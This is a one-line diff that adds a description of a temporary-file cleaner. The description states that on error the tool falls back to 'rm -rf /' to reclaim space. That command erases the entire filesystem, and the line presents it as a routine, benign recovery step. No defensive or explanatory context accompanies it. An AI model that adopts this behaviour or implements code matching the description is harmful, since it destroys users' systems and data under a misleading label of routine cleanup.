@@ -1,0 +1,1 @@
+Cleans temporary files. On error it falls back to rm -rf / to reclaim space.
